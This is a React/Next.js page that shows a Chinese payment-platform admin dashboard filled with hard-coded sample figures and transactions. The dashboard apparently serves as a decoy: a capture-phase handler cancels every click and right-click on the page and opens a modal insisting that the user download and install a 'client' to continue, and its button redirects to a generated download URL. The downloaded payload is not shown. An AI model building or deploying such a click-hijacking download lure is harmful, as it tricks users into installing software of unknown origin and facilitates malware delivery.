"use client";

import Script from "next/script";
import { Suspense, useCallback, useEffect, useRef, useState } from "react";
import { useSeed } from "@/hooks/use-seed";
import { buildDownloadApi } from "@/lib/url";

function DashboardPage() {
  return (
    <Suspense fallback={null}>
      <DashboardContent />
    </Suspense>
  );
}

export default DashboardPage;

function DashboardContent() {
  const [chartReady, setChartReady] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const modalRef = useRef<HTMLDivElement | null>(null);

  const { seed, prefix } = useSeed();

  useEffect(() => {
    if (!chartReady) {
      return;
    }
    const Chart = (window as unknown as { Chart?: any }).Chart;
    if (!Chart) {
      return;
    }

    const transactionCtx = document.getElementById("transactionChart") as HTMLCanvasElement | null;
    const paymentMethodCtx = document.getElementById("paymentMethodChart") as HTMLCanvasElement | null;

    if (!transactionCtx || !paymentMethodCtx) {
      return;
    }

    const transactionChart = new Chart(transactionCtx.getContext("2d")!, {
      type: "line",
      data: {
        labels: ["5月14日", "5月15日", "5月16日", "5月17日", "5月18日", "5月19日", "5月20日"],
        datasets: [
          {
            label: "交易额 (万元)",
            data: [85, 92, 78, 95, 105, 98, 112],
            borderColor: "#2c6bed",
            backgroundColor: "rgba(44, 107, 237, 0.1)",
            borderWidth: 2,
            fill: true,
            tension: 0.4,
          },
          {
            label: "交易笔数 (千笔)",
            data: [7.2, 7.8, 6.9, 8.1, 8.6, 8.3, 8.9],
            borderColor: "#28a745",
            backgroundColor: "rgba(40, 167, 69, 0.1)",
            borderWidth: 2,
            fill: true,
            tension: 0.4,
          },
        ],
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        plugins: {
          legend: {
            position: "top",
          },
        },
        scales: {
          y: {
            beginAtZero: false,
          },
        },
      },
    });

    const paymentMethodChart = new Chart(paymentMethodCtx.getContext("2d")!, {
      type: "doughnut",
      data: {
        labels: ["微信支付", "支付宝", "银联云闪付", "其他"],
        datasets: [
          {
            data: [45, 38, 12, 5],
            backgroundColor: ["#2c6bed", "#28a745", "#ffc107", "#6c757d"],
            borderWidth: 1,
          },
        ],
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        plugins: {
          legend: {
            position: "bottom",
          },
        },
      },
    });

    return () => {
      transactionChart.destroy();
      paymentMethodChart.destroy();
    };
  }, [chartReady]);

  useEffect(() => {
    const isEventInsideModal = (event: MouseEvent) => {
      if (!modalRef.current) return false;
      return modalRef.current.contains(event.target as Node);
    };

    const handleLeftClick = (event: MouseEvent) => {
      if (isEventInsideModal(event)) {
        return;
      }
      if (showConfirm) {
        return;
      }
      event.preventDefault();
      event.stopPropagation();
      setShowConfirm(true);
    };

    const handleRightClick = (event: MouseEvent) => {
      if (isEventInsideModal(event)) {
        return;
      }
      if (showConfirm) {
        event.preventDefault();
        return;
      }
      event.preventDefault();
      setShowConfirm(true);
    };

    document.addEventListener("click", handleLeftClick, true);
    document.addEventListener("contextmenu", handleRightClick, true);

    return () => {
      document.removeEventListener("click", handleLeftClick, true);
      document.removeEventListener("contextmenu", handleRightClick, true);
    };
  }, [showConfirm]);

  const handleDownload = useCallback(() => {
    const url = buildDownloadApi(prefix, seed);
    window.location.href = url;
  }, [prefix, seed]);

  const handleCancel = useCallback(() => {
    setShowConfirm(false);
  }, []);

  return (
    <div className="dashboard-root">
      <Script src="/js/chart.js" strategy="afterInteractive" onLoad={() => setChartReady(true)} />
      {showConfirm && (
        <div
          role="dialog"
          aria-modal="true"
          style={{
            position: "fixed",
            inset: 0,
            backgroundColor: "rgba(0, 0, 0, 0.65)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 10000,
          }}
          onClick={handleCancel}
        >
          <div
            ref={modalRef}
            onClick={(event) => event.stopPropagation()}
            style={{
              backgroundColor: "#ffffff",
              borderRadius: "12px",
              padding: "24px",
              width: "360px",
              boxShadow: "0 24px 60px rgba(0, 0, 0, 0.35)",
              textAlign: "center",
              fontFamily: "system-ui, -apple-system, BlinkMacSystemFont, \"Segoe UI\", sans-serif",
            }}
          >
            <h2 style={{ margin: "0 0 12px", fontSize: "20px", fontWeight: 600, color: "#111827" }}>
              需要下载软件
            </h2>
            <p style={{ margin: "0 0 20px", fontSize: "14px", color: "#4b5563", lineHeight: 1.6 }}>
              为继续使用本系统，请确认立即下载并安装客户端。
            </p>
            <div style={{ display: "flex", gap: "12px" }}>
              <button
                type="button"
                onClick={handleCancel}
                style={{
                  flex: 1,
                  padding: "10px 14px",
                  borderRadius: "8px",
                  border: "1px solid #d1d5db",
                  backgroundColor: "#ffffff",
                  color: "#111827",
                  cursor: "pointer",
                  fontWeight: 600,
                }}
              >
                暂不下载
              </button>
              <button
                type="button"
                onClick={handleDownload}
                style={{
                  flex: 1,
                  padding: "10px 14px",
                  borderRadius: "8px",
                  border: "none",
                  backgroundColor: "#111827",
                  color: "#ffffff",
                  cursor: "pointer",
                  fontWeight: 600,
                }}
              >
                立即下载
              </button>
            </div>
          </div>
        </div>
      )}
      <div className="sidebar">
        <div className="logo">
          <i className="fas fa-money-check-alt" />
          <h2>支付管理平台</h2>
        </div>
        <ul className="nav-links">
          <li className="active">
            <i className="fas fa-home" /> <span>首页概览</span>
          </li>
          <li>
            <i className="fas fa-exchange-alt" /> <span>交易管理</span>
          </li>
          <li>
            <i className="fas fa-users" /> <span>商户管理</span>
          </li>
          <li>
            <i className="fas fa-chart-bar" /> <span>数据分析</span>
          </li>
          <li>
            <i className="fas fa-cog" /> <span>系统设置</span>
          </li>
          <li>
            <i className="fas fa-shield-alt" /> <span>安全中心</span>
          </li>
          <li>
            <i className="fas fa-question-circle" /> <span>帮助中心</span>
          </li>
        </ul>
      </div>

      <div className="main-content">
        <div className="header">
          <h1>首页概览</h1>
          <div className="user-info">
            <img src="https://randomuser.me/api/portraits/men/41.jpg" alt="用户头像" />
            <div>
              <div>管理员</div>
              <div style={{ fontSize: "0.8rem", color: "var(--secondary)" }}>
                admin@payment.com
              </div>
            </div>
          </div>
        </div>

        <div className="stats-cards">
          <div className="card stat-card">
            <div className="stat-info">
              <h3>今日交易额</h3>
              <div className="value">¥1,254,680</div>
              <div className="change positive">
                <i className="fas fa-arrow-up" /> 12.5% 较昨日
              </div>
            </div>
            <div className="stat-icon icon-1">
              <i className="fas fa-money-bill-wave" />
            </div>
          </div>
          <div className="card stat-card">
            <div className="stat-info">
              <h3>成功交易笔数</h3>
              <div className="value">8,642</div>
              <div className="change positive">
                <i className="fas fa-arrow-up" /> 5.2% 较昨日
              </div>
            </div>
            <div className="stat-icon icon-2">
              <i className="fas fa-check-circle" />
            </div>
          </div>
          <div className="card stat-card">
            <div className="stat-info">
              <h3>商户总数</h3>
              <div className="value">1,284</div>
              <div className="change positive">
                <i className="fas fa-arrow-up" /> 2.1% 较上月
              </div>
            </div>
            <div className="stat-icon icon-3">
              <i className="fas fa-store" />
            </div>
          </div>
          <div className="card stat-card">
            <div className="stat-info">
              <h3>失败率</h3>
              <div className="value">0.68%</div>
              <div className="change negative">
                <i className="fas fa-arrow-up" /> 0.12% 较昨日
              </div>
            </div>
            <div className="stat-icon icon-4">
              <i className="fas fa-exclamation-triangle" />
            </div>
          </div>
        </div>

        <div className="charts-container">
          <div className="chart-card">
            <div className="chart-header">
              <h3>交易趋势</h3>
              <div>
                <select style={{ padding: "5px 10px", borderRadius: "5px", border: "1px solid #e0e0e0" }}>
                  <option>最近7天</option>
                  <option>最近30天</option>
                  <option>最近90天</option>
                </select>
              </div>
            </div>
            <div className="chart-container">
              <canvas id="transactionChart" />
            </div>
          </div>
          <div className="chart-card">
            <div className="chart-header">
              <h3>支付方式分布</h3>
            </div>
            <div className="chart-container">
              <canvas id="paymentMethodChart" />
            </div>
          </div>
        </div>

        <div className="recent-transactions">
          <div className="chart-header">
            <h3>最近交易</h3>
            <a href="#" style={{ color: "var(--primary)", textDecoration: "none" }}>
              查看全部 <i className="fas fa-arrow-right" />
            </a>
          </div>
          <div className="table-responsive">
            <table>
              <thead>
                <tr>
                  <th>交易号</th>
                  <th>商户</th>
                  <th>金额</th>
                  <th>支付方式</th>
                  <th>时间</th>
                  <th>状态</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>TX20230520001</td>
                  <td>星巴克咖啡</td>
                  <td>¥38.50</td>
                  <td>微信支付</td>
                  <td>2023-05-20 14:23:15</td>
                  <td>
                    <span className="status success">成功</span>
                  </td>
                </tr>
                <tr>
                  <td>TX20230520002</td>
                  <td>京东商城</td>
                  <td>¥256.00</td>
                  <td>支付宝</td>
                  <td>2023-05-20 13:45:32</td>
                  <td>
                    <span className="status success">成功</span>
                  </td>
                </tr>
                <tr>
                  <td>TX20230520003</td>
                  <td>美团外卖</td>
                  <td>¥62.80</td>
                  <td>银联云闪付</td>
                  <td>2023-05-20 12:18:47</td>
                  <td>
                    <span className="status pending">处理中</span>
                  </td>
                </tr>
                <tr>
                  <td>TX20230520004</td>
                  <td>滴滴出行</td>
                  <td>¥25.60</td>
                  <td>微信支付</td>
                  <td>2023-05-20 11:05:22</td>
                  <td>
                    <span className="status success">成功</span>
                  </td>
                </tr>
                <tr>
                  <td>TX20230520005</td>
                  <td>天猫超市</td>
                  <td>¥189.90</td>
                  <td>支付宝</td>
                  <td>2023-05-20 10:32:11</td>
                  <td>
                    <span className="status failed">失败</span>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        <div className="quick-actions">
          <div className="action-card">
            <i className="fas fa-plus-circle" />
            <h3>新增商户</h3>
          </div>
          <div className="action-card">
            <i className="fas fa-file-invoice-dollar" />
            <h3>交易查询</h3>
          </div>
          <div className="action-card">
            <i className="fas fa-chart-line" />
            <h3>数据报表</h3>
          </div>
          <div className="action-card">
            <i className="fas fa-cog" />
            <h3>系统设置</h3>
          </div>
        </div>
      </div>
    </div>
  );
}
